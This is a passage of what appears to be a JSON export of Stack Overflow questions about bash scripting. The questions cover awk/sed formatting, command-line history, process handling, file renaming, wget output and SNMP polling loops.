script for formatting output</a>  </p>\n</blockquote>\n\n\n\n<p>I have a jacl script that spits out the text below, I want it better formatted.How can I achieve this ?</p>\n\n<pre><code>Stats for Cell=CELL Node=N01 Server=APP at 15:48:06\nStats name=WebContainer, type=threadPoolModule\nname=PoolSize, ID=4, description=The average number of threads in a pool., unit=N/A, type=BoundedRangeStatistic, lowWaterMark=1, highWaterMark=50, current=4, integral=9.16145228E8, lowerBound=50, upperBound=50\nStats name=ORB.thread.pool, type=threadPoolModule\nname=PoolSize, ID=4, description=The average number of threads in a pool., unit=N/A, type=BoundedRangeStatistic, lowWaterMark=1, highWaterMark=10, current=1, integral=1.26898089E8, lowerBound=10, upperBound=50\nStats name=WorkManager.BPENavigationWorkManager, type=threadPoolModule\nname=PoolSize, ID=4, description=The average number of threads in a pool., unit=N/A, type=BoundedRangeStatistic, lowWaterMark=1, highWaterMark=10, current=5, integral=8.53089448E8, lowerBound=1, upperBound=5\nStats name=WorkManager.BPESchedulerWorkManager, type=threadPoolModule\nname=PoolSize, ID=4, description=The average number of threads in a pool., unit=N/A, type=BoundedRangeStatistic, lowWaterMark=1, highWaterMark=1, current=0, integral=0.0, lowerBound=1, upperBound=5Scrits commands to convert the above to below.(Awk or sed ?)\n</code></pre>\n\n<p>How I would like to see the output.</p>\n\n<pre><code>CELL:N01:APP at 15:48:06\nWebContainer threadPool current=4\nORB.thread.pool threadPool current=1\nWorkManager.BPENavigationWorkManager threadPool current=5\nWorkManager.BPESchedulerWorkManager threadPool current=0\n</code></pre>\n"},{"tags":["bash","command-line","keyboard-shortcuts","input-history"],"answer_count":3,"favorite_count":8,"up_vote_count":18,"down_vote_count":0,"view_count":2538,"score":18,"question_id":4009412,"title":"bash - first argument of the previous command","body":"<p>I know that ESC DOT gives you the last argument of the last command.</p>\n\n<p>But I'm interested in first argument of the last command.\nIs there a key binding to do so?</p>\n\n<p>On the same lines, is there a generic way of getting nth argument from last command.\n(I know that in a bash script you can use $0, $1 etc., but these don't work on commandline)</p>\n\n<p><strong>Also, what about iterating through 0th argument of previous commands, like we can do with last argument by continuously pressing ESC DOT</strong></p>\n"},{"tags":["bash","alias"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13260969,"title":"Prevent bash alias from evaluating statement at shell start","body":"<p>Say I have the following (useless) alias.</p>\n\n<pre><code>alias pwd_alias='echo `pwd`'\n</code></pre>\n\n<p>This alias is not \"dynamic\". It evaluates <code>pwd</code> as soon as the shell starts. Is there anyway to delay the evaluation of the expression in the ticks until the alias's runtime?</p>\n"},{"tags":["r","bash","function","split"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":58,"score":3,"question_id":13260252,"title":"A better way to extract functions from an R script?","body":"<p>Say I have a file \"myfuncs.R\" with a few functions in it:</p>\n\n<pre><code>A &lt;- function(x) x\nB &lt;- function(y) y\nC &lt;- function(z) z\n</code></pre>\n\n<p>I want to place all the functions contained within \"myfuncs.R\" into their own files, named appropriately.  I have a simple Bash-shell script to extract functions and place them in separate files:</p>\n\n<pre><code>split -p \"function\\(\" myfuncs.R tmpfunc\ngrep \"function(\" tmpfunc* | awk '{\n  # strip first-instances of function assignment\n  sub(\"&lt;-\", \" \")\n  sub(\"=\", \" \")\n  sub(\":\", \" \")  # and colon introduced by grep\n  mv=$1\n  mvto=sprintf(\"func_%s.R\",$2)\n  print \"mv\", mv, mvto\n}' | sh\n</code></pre>\n\n<p>leaving me with:</p>\n\n<pre><code>func_A.R\nfunc_B.R\nfunc_C.R\n</code></pre>\n\n<p>But, this script has obvious limitations.  For example, it will misbehave when function 'A' has a nested function:</p>\n\n<pre><code>A &lt;- function(x){\n    Aa &lt;- function(x){x}\n    return(Aa)\n}\n</code></pre>\n\n<p>and outright fails if the whole function is on a single line.</p>\n\n<p>Does anyone know of a more robust, and less error-prone method to do this? </p>\n"},{"tags":["linux","file","bash","types"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":35,"score":-1,"question_id":13259869,"title":"bash find file signature","body":"<p>I need to check type of file</p>\n\n<pre><code>TargetType is one of the following numbers specifying the type of the target ﬁle\n    0 = any ﬁle\n    1 = Portable Executable, both 32- and 64-bit\n    2 = ﬁle inside OLE2 container\n    3 = HTML\n    4 = Mail ﬁle\n    5 = Graphics\n    6 = ELF\n    7 = ASCII text ﬁle (normalized)\n    8 = Unused\n    9 = Mach-O ﬁles\n</code></pre>\n\n<p>I know how to do for HTML, ASCII, ELF and graphics but no other.</p>\n\n<pre><code>file  FILE_to_check | awk '{print $2}'\n</code></pre>\n\n<p>return ASCII if ASCII file</p>\n\n<p>I also need to check if the file is a binary file otherwise I do a hex dump(no problem for that)</p>\n\n<pre><code>file -i FILE_to_check | awk -F'=' '{ print $2 }'\n</code></pre>\n\n<p>return binary</p>\n\n<p>I don't know if the correct way to do.</p>\n\n<p>If you have any idea ...</p>\n\n<p>Thanks</p>\n"},{"tags":["bash","shell","sed","awk","jacl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":35,"score":-1,"question_id":13259293,"title":"Shell script for formatting output","body":"<pre><code>Stats for Cell=CELL Node=N01 Server=APP at 15:48:06\nStats name=WebContainer, type=threadPoolModule\nname=PoolSize, ID=4, description=The average number of threads in a pool., unit=N/A, type=BoundedRangeStatistic, lowWaterMark=1, highWaterMark=50, current=4, integral=9.16145228E8, lowerBound=50, upperBound=50\nStats name=ORB.thread.pool, type=threadPoolModule\nname=PoolSize, ID=4, description=The average number of threads in a pool., unit=N/A, type=BoundedRangeStatistic, lowWaterMark=1, highWaterMark=10, current=1, integral=1.26898089E8, lowerBound=10, upperBound=50\nStats name=WorkManager.BPENavigationWorkManager, type=threadPoolModule\nname=PoolSize, ID=4, description=The average number of threads in a pool., unit=N/A, type=BoundedRangeStatistic, lowWaterMark=1, highWaterMark=10, current=5, integral=8.53089448E8, lowerBound=1, upperBound=5\nStats name=WorkManager.BPESchedulerWorkManager, type=threadPoolModule\nname=PoolSize, ID=4, description=The average number of threads in a pool., unit=N/A, type=BoundedRangeStatistic, lowWaterMark=1, highWaterMark=1, current=0, integral=0.0, lowerBound=1, upperBound=5\n</code></pre>\n\n<p>Scrits commands to convert the above to below.(Awk or sed ?)</p>\n\n<pre><code>CELL:N01:APP at 15:48:06\nWebContainer threadPool current=4\nORB.thread.pool threadPool current=1\nWorkManager.BPENavigationWorkManager threadPool current=5\nWorkManager.BPESchedulerWorkManager threadPool current=0\n</code></pre>\n"},{"tags":["linux","bash","time","epoch"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":14,"score":-1,"question_id":13257066,"title":"bash script to convert epoch to standard in a text file","body":"<p>I work with several text files that use epoch, I would like a bash script that will scan a specific file for epoch and output another text document with it as standard time.</p>\n"},{"tags":["bash"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13255843,"title":"Why is Bash not allowing me to enter input at prompts?","body":"<p>For some reason, my Macbook bash terminal is not allowing me to enter \"y\" from a prompt.\nI'm not really sure how to describe this, but you can see the action below.</p>\n\n<pre><code>$ sudo pip uninstall django  \n\nPassword:  \nUninstalling Django:  \n\n/Library/Frameworks/Python.framework/Versions/2.7/bin/django-admin.py  \n  /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/Django-1.4.2-py2.7.egg-info  \n/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/django  \n\nProceed (y/n)? **y^M^?^?^?^M^M^M^M^M^C**Your response ('y\\r\\x7f\\x7f\\x7f') was not one of the expected responses: y, n\n\nProceed (y/n)? y^M^C^D^M^M^M^M^CYour response ('y\\r\\x04') was not one of the expected responses: y, n  \n\nProceed (y/n)? Y^M^Xc^C^D^CYour response ('y\\r\\x18c') was not one of the expected responses: y, n  \n\nProceed (y/n)? ^D^CYour response ('') was not one of the expected responses: y, n\nProceed (y/n)? ^COperation cancelled by user\n</code></pre>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":22,"score":0,"question_id":13257110,"title":"Bash script, pid of xterm process","body":"<p>I have a small problem. In bash scripting i need to run an xterm who do some things like this.</p>\n\n<p>xterm -e \"(time ./program.exe 127.0.0.1) 2> out.txt\" </p>\n\n<p>How can i say the pid of this process? </p>\n\n<p>I need to wait who it finisced for write the output and merge with another fine.</p>\n\n<p>Thank so much to all!!</p>\n"},{"tags":["linux","bash","shell","sh","kill"],"answer_count":5,"favorite_count":4,"up_vote_count":4,"down_vote_count":0,"view_count":78,"score":4,"question_id":13221338,"title":"How to Kill Current Command When Bash Script is Killed","body":"<p>I current have a script that looks like this.</p>\n\n<pre><code># code\n\nmplayer \"$vid\"\n\n# more code\n</code></pre>\n\n<p>The problem is that if this script is killed the mplayer process lives.  I wondering how I could make it so that killing the script would kill mplayer as well.</p>\n\n<p>I can't use <code>exec</code> because I need to run commands after mplayer.</p>\n\n<pre><code>exec mplayer \"$vid\"\n</code></pre>\n\n<p>The only possible solution I can think of is to spawn it in the background and wait until it finishes manually.  That way I can get it's PID and kill it when the script gets killed, not exactly elegant.  I was wondering what the \"proper\" or best way of doing this is.</p>\n"}]}
{"total":16352,"page":2,"pagesize":100,"questions":[{"tags":["linux","bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13250180,"title":"Flock using error message if not able to get lock on the file","body":"<p>My bash code look likes:</p>\n\n<pre><code>  set -e\n  (\n     flock -n 9\n     main $@\n   ) 9&gt;/var/lock/mylockfile\n</code></pre>\n\n<p>But currently it don't show any error message, if it is not able to get lock on the file. \nIs there a way to show error message ?</p>\n"},{"tags":["string","bash","sed","grep"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":59,"score":1,"question_id":13242469,"title":"bash sed/grep text between two words","body":"<p>I am trying to output a string that contains everything between two words of a string:</p>\n\n<p>input: \"Here is a String\"</p>\n\n<p>output; \"is a\"</p>\n\n<p>Using: </p>\n\n<pre><code>    sed -n '/Here/,/String/p'\n</code></pre>\n\n<p>includes the endpoints, but I don't want to include them.</p>\n"},{"tags":["linux","bash"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13255416,"title":"xdotools changing case","body":"<p>I have a script that works on one computer (Ubuntu 11.10) but not on another (Mint 13).  The problem is with the <code>xdotools</code> command.  Without going into the script details, the problem is that the case of the variable including in the string I am passing to xdotools is changed to lower-case.  The following illustrates the problem:</p>\n\n<pre><code>export FOO=\"FOO\"\nxdotools type \" the value of FOO is '$FOO'\"\n</code></pre>\n\n<p>This prints \" the value of OO is fOO \"</p>\n\n<p>Any ideas on what I'm doing wrong?</p>\n"},{"tags":["bash","pattern-matching","switch-statement"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":35,"score":3,"question_id":13254425,"title":"Using variable as case pattern in Bash","body":"<p>I'm trying to write a Bash script that uses a variable as a pattern in a case statement. However I just cannot get it to work.</p>\n\n<p>Case statement:</p>\n\n<pre><code>case \"$1\" in\n    $test)\n        echo \"matched\"\n        ;;\n    *)\n        echo \"didn't match\"\n        ;;\nesac\n</code></pre>\n\n<p>I've tried this with assigning <code>$test</code> as <code>aaa|bbb|ccc</code>, <code>(aaa|bbb|ccc)</code>, <code>[aaa,bbb,ccc]</code> and several other combinations. I also tried these as the pattern in the case statement: <code>@($test)</code>, <code>@($(echo $test))</code>, <code>$($test)</code>. Also no success.</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>For clarity, I would like the variable to represent multiple patterns like this:</p>\n\n<pre><code>case \"$1\" in\n    aaa|bbb|ccc)\n        echo \"matched\"\n        ;;\n    *)\n        echo \"didn't match\"\n        ;;\nesac\n</code></pre>\n"},{"tags":["python","bash","ssh","stdout","pid"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":45,"score":2,"question_id":13202483,"title":"Redirect to a file output of remote python app started through ssh","body":"<p>[EDITED]</p>\n\n<p>I have a python app in a remote server that i need to debug, when I run the app locally it prints some debug information (including python tracebacks) that i need to monitor.</p>\n\n<p>Thanks to <a href=\"http://stackoverflow.com/users/1356721/jeremy\">jeremy</a> i got to monitor the output file using <em>tail -F</em> and studying his code I got <a href=\"http://jimmyg.org/blog/2009/working-with-python-subprocess.html\" rel=\"nofollow\">here</a> where i found the following variation of his command:</p>\n\n<pre><code>ssh root@$IP 'nohup python /root/python/run_dev_server.py &amp;&gt;&gt; /var/log/myapp.log &amp;'\n</code></pre>\n\n<p>This gets me almost exactly what i want, loggin information and python tracebacks, but i do not get any of the information displayed using <em>print</em> from python which i need.</p>\n\n<p>so I also tried his command:</p>\n\n<pre><code>ssh root@$IP 'nohup python /root/python/run_dev_server.py 2&gt;&amp;1 &gt;&gt; /var/log/myapp.log &amp;'\n</code></pre>\n\n<p>it logs in the file the output of the program from <em>print</em> and also the logging information, but all the tracebacks are lost so i cannot debug the python exceptions.</p>\n\n<p>Is there a way I can capture all the information produced by the app?</p>\n\n<p>Thanks in advance for any suggestion.</p>\n"},{"tags":["mysql","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":23,"score":-1,"question_id":13253058,"title":"Bash Scripting for getting files from s3","body":"<p>Can you please help me or give me a sample bash script for getting / download a file from s3 ( .sql file ) then restore it to specific tables. </p>\n\n<p>Note :</p>\n\n<p>Also the acl is not in public please include also how can i set it on public at bash.</p>\n\n<p>Thanks in Advance!</p>\n"},{"tags":["linux","bash","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13249698,"title":"HAL - UDISKS, human readable, convert bytes to gigabytes in bash script","body":"<p><strong>First Question</strong></p>\n\n<p>I'm currently using HAL in a bash script to get the size of a specific device with following command.</p>\n\n<pre><code>HAL_SIZE=$(hal-get-property --udi $UDI --key storage.removable.media_size)\n</code></pre>\n\n<p>The result (e.g): <em>4110188544/</em></p>\n\n<p>But how can I convert this value to human readable format like GB:</p>\n\n<pre><code>4 110 188 544 bytes = 3.82791138 gigabytes\n</code></pre>\n\n<p><strong>Second Question</strong></p>\n\n<pre><code>    for UDI in $(hal-find-by-property --key storage.bus --string usb)\ndo\n    HAL_TMP=`hal-get-property --udi $UDI --key storage.removable.media_available`\n    if [ \"$HAL_TMP\" = \"true\" ]; then\n        HAL_DEV=$(hal-get-property --udi $UDI --key block.device)\n        HAL_SIZE=$(hal-get-property --udi $UDI --key storage.removable.media_size)\n        HAL_TYPE=$(hal-get-property --udi $UDI --key storage.drive_type)\n</code></pre>\n\n<p>Does anybody have some expirence with <em>udisks</em>, because HAL won't be longer supported on the most linux distribution, so I am thinking of to use <em>udisks</em></p>\n\n<p>How do I have to adapt the above mentioned commands but use <em>udisks</em> instead of <em>hal</em></p>\n\n<p>Thanks!</p>\n"},{"tags":["bash","unix"],"answer_count":4,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":63,"score":4,"question_id":13241964,"title":"How do I get a user's friendly username on UNIX?","body":"<p>I want to get the \"friendly\" name, not the username, at least if such a string exists for the given user. Things I've tried:</p>\n\n<pre><code>whoami\njamesarosen\n\nid -un\njamesarosen\n\nid -p\nuid jamesarosen\ngroups  staff com.apple.access_screensharing ...\n\nid -P\njamesarosen:********:501:20::0:0:James A. Rosen:/Users/jamesarosen:/bin/bash\n</code></pre>\n\n<p>That last one has the information I'm looking for, but I'd prefer not to have to parse it out, particularly since I'm not terribly confident that the format (specifically the number of <code>:</code>s) will remain consistent across OSes.</p>\n"},{"tags":["bash","loops","if-statement","script","exists"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":13146630,"title":"Loop script until file has equal size for a minute","body":"<p>I have cronjob to run a script every day in specific time. The script is for conversion a large file (about 2GB) in specific folder. The problem is that not every day my coleague put the file in the folder before the time, written as cronjob.</p>\n\n<p>Please help me to add commands in the script or to write second script for:</p>\n\n<ol>\n<li>Check if the file exists in the folder.</li>\n<li>If the previous action is true, check the file size every minute. (I would like to avoid conversion of still incomming large file).</li>\n<li>If filesize stays unchanged for 2 minutes, start the script for conversion.</li>\n</ol>\n\n<p>I give you the important lines of the script so far:</p>\n\n<pre><code>cd /path-to-folder\nfor $i in *.mpg; do avconv -i \"$i\" \"out-$i.mp4\" ; done\n</code></pre>\n\n<p>10x for the help!</p>\n\n<p><strong>NEW CODE AFTER COMMENTS:</strong></p>\n\n<p>There is file in the folder!</p>\n\n<pre><code>#! /bin/bash\n\n\ncdate=$(date +%Y%m%d)\ndump=\"/path/folder1\"\nbase=$(ls \"$dump\")\n\nif [ -n \"$file\"]\nthen\n    file=\"$dump/$base\"\n    size=$(stat -c '%s' \"$file\")\n    count=0\n    while sleep 10\n    do\n        size0=$(stat -c '%s' \"$file\")\n        if [ $size=$size0 ]\n        then $((count++))\n             count=0\n        fi\n        if [ $count = 2 ]\n        then break\n        fi\n    done\n    # file has been stable for two minutes. Start conversion.\n\nCONVERSION CODE\n\nfi\n</code></pre>\n\n<p>MESSAGE IN TERMINAL: Maybe error???</p>\n\n<pre><code>script.sh: 17: script.sh: arithmetic expression: expecting primary: \"count++\"\n</code></pre>\n"},{"tags":["bash","variables","wildcard","expansion"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":32,"score":2,"question_id":13252329,"title":"Loop over array, preventing wildcard expansion (*)","body":"<p>I'm trying to figure out what I thought would be a trivial issue in BASH, but I'm having difficulty finding the correct syntax. I want to loop over an array of values, one of them being an asterisk (*), I do not wish to have any wildcard expansion happening during the process.</p>\n\n<pre><code> WHITELIST_DOMAINS=\"* *.foo.com *.bar.com\"\n for domain in $WHITELIST_DOMAINS\n do\n    echo \"$domain\"\n done\n</code></pre>\n\n<p>I have the above, and I'm trying to get the following output:</p>\n\n<pre><code> *\n *.foo.com\n *.bar.com\n</code></pre>\n\n<p>Instead of the above, I get a directory listing on the current directory, followed by *.foo.com and *.bar.com</p>\n\n<p>I know I need some escaping or quoting somewhere.. the early morning haze is still thick on my brain.</p>\n\n<p>I've reviewed these questions:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/10888764/how-to-escape-wildcard-expansion-in-a-variable-in-bash\">How to escape wildcard expansion in a variable in bash?</a></p>\n\n<p><a href=\"http://stackoverflow.com/questions/11456403/stop-shell-wildcard-character-expansion\">Stop shell wildcard character expansion?</a></p>\n"},{"tags":["linux","bash","wget","sh"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":3206,"score":2,"question_id":4686464,"title":"Howto show wget progress bar only?","body":"<p>Howto show wget progress bar only? </p>\n\n<p>for example</p>\n\n<p><code>wget <a href=\"http://somesite.com/TheFile.jpeg\" rel=\"nofollow\">http://somesite.com/TheFile.jpeg</a></code></p>\n\n<pre>\ndownloading: TheFile.tar.gz ...\n--09:30:42--  http://somesite.com/TheFile.jpeg\n           => `/home/me/Downloads/TheFile.jpeg'\nResolving somesite.co... xxx.xxx.xxx.xxx.\nConnecting to somesite.co|xxx.xxx.xxx.xxx|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1,614,820 (1.5M) [image/jpeg]\n\n25% [======>                              ] 614,424      173.62K/s    ETA 00:14\n</pre>\n\n<p>How can i get it to look like this </p>\n\n<pre>\ndownloading: TheFile.jpeg ...\n25% [======>                              ] 614,424      173.62K/s    ETA 00:14\n</pre>\n\n<p>I know curl can do that, however i need to get wget to do that job.</p>\n\n<p>Any help would be much appreciated.</p>\n"},{"tags":["linux","bash","loops","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":50,"score":3,"question_id":13240707,"title":"How to append each column of file1 to a specific field of file2 and make a new output file?","body":"<p>I want to append each column of file 1 as the 4th column of file 2 and export as a new file with the column number from file 1 or something similar as the output name.</p>\n\n<p>Input File 1 and 2 have the same number of rows:</p>\n\n<p>Input File 1 has N columns:</p>\n\n<pre><code>12 23 34  .....\n33 34 23\n67 09 34\n45 67 34\n65 76 44\n64 33 96\n</code></pre>\n\n<p>Input File 2 originally has 5 columns</p>\n\n<pre><code>AA BB FF DD 6\nAA CC HH NN 7\nAA DD II RR 4\nAA EE JJ PP 2\nAA FF KK QQ 9\nAA GG LL SS 8\n</code></pre>\n\n<p>For example, the first 3 output files would look like this:</p>\n\n<p>Output File 1 (column 1):</p>\n\n<pre><code>AA BB FF 12 DD 6\nAA CC HH 33 NN 7\nAA DD II 67 RR 4\nAA EE JJ 45 PP 2\nAA FF KK 65 QQ 9\nAA GG LL 64 SS 8\n</code></pre>\n\n<p>Output File 2 (column 2):</p>\n\n<pre><code>AA BB FF 23 DD 6\nAA CC HH 34 NN 7\nAA DD II 09 RR 4\nAA EE JJ 67 PP 2\nAA FF KK 76 QQ 9\nAA GG LL 33 SS 8\n</code></pre>\n\n<p>Output File 3 (column 3):</p>\n\n<pre><code>AA BB FF 34 DD 6\nAA CC HH 23 NN 7\nAA DD II 34 RR 4\nAA EE JJ 34 PP 2\nAA FF KK 44 QQ 9\nAA GG LL 96 SS 8\n</code></pre>\n\n<p>The new file names can be file1, file2, file3...or column1, column2, column3....or something similar. How can I achieve this please? (for loop, awk, paste, etc.)</p>\n\n<p>Any suggestions would be appreciated.</p>\n"},{"tags":["bash","loops"],"answer_count":6,"favorite_count":19,"up_vote_count":73,"down_vote_count":0,"view_count":41949,"score":73,"question_id":1289026,"title":"Syntax for a single-line BASH infinite while loop","body":"<p>Having trouble coming up with the right combination of semicolons and/or braces.  I'd like to do this, but as a one-liner from the command line:</p>\n\n<pre><code>while [ 1 ]\ndo\n    foo\n    sleep 2\ndone\n</code></pre>\n"},{"tags":["bash"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13250425,"title":"bash - Test if directory contains files ending on .suite","body":"<p>I'm currently writing a bash script for executing test suites. Besides passing the suites directly to this script, like</p>\n\n<pre><code>./bash-specs test.suite\n</code></pre>\n\n<p>it should also be able to execute all scripts in a given directory if no suite is passed to it, like so</p>\n\n<pre><code>./bash-specs # executes all tests in the directory, namely test.suite\n</code></pre>\n\n<p>This is implemented like this</p>\n\n<pre><code>(($# == 0)) &amp;&amp; set -- *.suite\n</code></pre>\n\n<p>So, if no suite is passed, all the files ending on .suite are executed. This works fine but fails if the directory contains no such files.</p>\n\n<p>That means I will also need a check to test if there actually are files with that ending.\nHow would I do this in bash?</p>\n\n<p>I thought a test like </p>\n\n<pre><code>[[ -f *.suite ]]\n</code></pre>\n\n<p>should work but it seems to fail when there are more than one file in the directory.</p>\n"},{"tags":["regex","perl","bash","rename"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":13250694,"title":"Replace and add leading zeros when renaming files","body":"<p>Please be patient, this post will be somewhat long...</p>\n\n<p>I have a bunch of files, some of them with a simple and clean name (e.g. 1E01.txt) and some with a lot of extras:</p>\n\n<pre><code>Sample2_Name_E01_-co_032.txt\nSample2_Name_E02_-co_035.txt\n...\nSample12_Name_E01_-co_061.txt\n</code></pre>\n\n<p>and so on. What is important here is the number after \"Sample\" and the letter+number after \"<em>Name</em>\" - the rest is disposable. If i get rid of the non-important parts, the filename reduces to the same pattern as the \"clean\" filenames (2E01.txt, 2E02.txt, ..., 12E01.txt). I've managed to rename the files with the following expression (came up with this one myself, don't know if is very elegant but works fine):</p>\n\n<pre><code>rename -v 's/Sample([0-9]+)_Name_([A-Z][0-9]+).*/$1$2\\.txt/' *.txt\n</code></pre>\n\n<p>Now, the second part, is adding a leading zero for filenames with just one digit, such as 1E01.txt turns into 01E01.txt. I've managed to to this with (found and modified this on another StackExchange post): </p>\n\n<pre><code>rename -v 'unless (/^[0-9]{2}.*\\.txt/) {s/^([0-9]{1}.*\\.txt)$/0$1/;s/0*([0-9]{2}\\..*)/$1/}' *.txt\n</code></pre>\n\n<p>So I finally got to my question: is there a way to merge both expressions in just one rename command? I know I could do a bash script to automate the process, but what I want is to find a one-pass renaming solution.</p>\n\n<p>thanks</p>\n"},{"tags":["bash","vi","readline"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":248,"score":1,"question_id":6839273,"title":"bash/readline equivalent of escape-dot in vi-mode","body":"<p>Having recently switched to vi-mode in bash, the one thing I miss is <kbd>esc</kbd> <kbd>.</kbd> to get the last argument of the last command.</p>\n\n<p>I know about <kbd>ctrl</kbd> <kbd>_</kbd>, but I always end up hitting <kbd>ctrl</kbd> <kbd>-</kbd> instead.</p>\n\n<p>Is there another vi-mode equivalent for this?</p>\n"},{"tags":["bash","file","shell","random"],"answer_count":8,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":7098,"score":7,"question_id":701505,"title":"Best way to choose a random file from a directory in a shell script","body":"<p>What is the best way to choose a random file from a directory in a shell script?</p>\n\n<p>Here is my solution in Bash but I would be very interested for a more portable (non-GNU) version for use on Unix proper.</p>\n\n<pre><code>dir='some/directory'\nfile=`/bin/ls -1 \"$dir\" | sort --random-sort | head -1`\npath=`readlink --canonicalize \"$dir/$file\"` # Converts to full path\necho \"The randomly-selected file is: $path\"\n</code></pre>\n\n<p>Anybody have any other ideas?</p>\n\n<p><strong>Edit:</strong> lhunath makes a good point about parsing <code>ls</code>.  I guess it comes down to whether you want to be portable or not.  If you have the GNU findutils and coreutils then you can do:</p>\n\n<pre><code>find \"$dir\" -maxdepth 1 -mindepth 1 -type f -print0 \\\n  | sort --zero-terminated --random-sort \\\n  | sed 's/\\d000.*//g/'\n</code></pre>\n\n<p>Whew, that was fun!  Also it matches my question better since I said \"random file\".  Honsetly though, these days it's hard to imagine a Unix system deployed out there having GNU installed but not Perl 5.</p>\n"},{"tags":["linux","bash","shell","script"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":57,"score":3,"question_id":13247069,"title":"Check if the file exist only by the file name (without the extension)","body":"<p>This works just fine</p>\n\n<pre><code>if [[ -e img.png ]]\nthen\n     echo \"exist\"\nelse\n     echo \"doesn't exist\"\nfi\n</code></pre>\n\n<p>but what if I know that there might be imgage with name img but I do not know if the file is .jpg , .gif , .jpeg , .tff and so on.</p>\n\n<p>I do not care what is the extension I just want to know if there is a file with name 'img'</p>\n\n<p>How can I do this ?</p>\n"},{"tags":["bash","shell","snmp","net-snmp"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":13228630,"title":"shell script for Net-snmp (get/walk) is not efficient","body":"<pre><code>#!/bin/bash\nfor i in `seq 1 3000`\ndo\n    index=`snmpget -v 2c -c public -Oqv localhost 1.3.6.1.4.1.21067.4.1.1.1.$i` \ndone\n\nfor i in `seq 1 3000`\ndo\n    upload=`snmpget -v 2c -c public -Oqv localhost 1.3.6.1.4.1.21067.4.1.1.10.$i` \ndone\n\nfor i in `seq 1 3000`\ndo\n    download=`snmpget -v 2c -c public -Oqv localhost 1.3.6.1.4.1.21067.4.1.1.11.$i` \ndone\n</code></pre>\n\n<p>(ubuntu-12.04)\nabove is my shell script....with every execution of snmpget command it returns an integer and stores value in above three variables...\nthe problem is the data table is of 9000 values. so with this script it is giving too much time consuption and bettelnake.</p>\n\n<p>can any one suggest me some simple \"SNMPWALK\"(or anything else) used script with that I can store all this data in to a single array[9000] or with three parse,in three different arrays with index of 1 to 3000.so I can decrease time as much as possible. </p>\n\n<p>for example : snmpwalk -v 2c -c public -Oqv localhost 1.3.6.1.4.1.21067 gives all the values,but I dont know how to store all these in a array with different index.\n..................................................................</p>\n\n<p>see I have tried below : but giving me errors...</p>\n\n<pre><code>cat script.sh\n\n #!/bin/sh\nOUTPUT1=$(snmpbulkwalk -Oqv -c public -v 2c localhost 1.3.6.1.2.1.2.2.1.1 2&gt; /dev/null)\ni=1\nfor LINE in ${OUTPUT1} ;\n    do\n        OUTPUT1[$i]=$LINE;\n        i=`expr $i + 1`\n    done\n\nsh script.sh\nj4.sh: 6: j4.sh: OUTPUT1[1]=1: not found\nj4.sh: 6: j4.sh: OUTPUT1[2]=2: not found\n</code></pre>\n"},{"tags":["java","bash","maven"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":13248920,"title":"Run a command line with an option as an arguments","body":"<p>I want to run an instruction using bash with some arguments. Among these arguments I have \n<code>\"-- stat\"</code>. So when I run my instruction, the bash recognize the <code>\"--stat\"</code> as an option of Mavan and not an arguments.</p>\n\n<p>Example of my instruction :</p>\n\n<pre><code>mvn exec:java -Dexec.mainClass=\"MainClass\" -Dexec.args=\"args1 --stat args3 ...\"\n</code></pre>\n\n<p>and when I run this command line I have this error :</p>\n\n<pre><code>Unable to parse command line options: Unrecognized option: --stat\n</code></pre>\n\n<p>What can I do to run this command line with <code>\"--stat\"</code> arguments ?</p>\n"},{"tags":["bash","sed"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":630,"score":0,"question_id":7301026,"title":"Extract numbers from filename","body":"<p>In BASH I thought to use <code>sed</code>, but can't figure how to extract pattern instead usual replace.</p>\n\n<p>For example:</p>\n\n<p>FILENAME = 'blah_blah_#######_blah.ext'</p>\n\n<p>number of ciphers (in above example written with \"#\" substitute) could be either 7 or 10</p>\n\n<p>I want to extract only the number</p>\n"},{"tags":["bash","unix"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":44,"score":1,"question_id":13247131,"title":"How to construct a list from a variable in 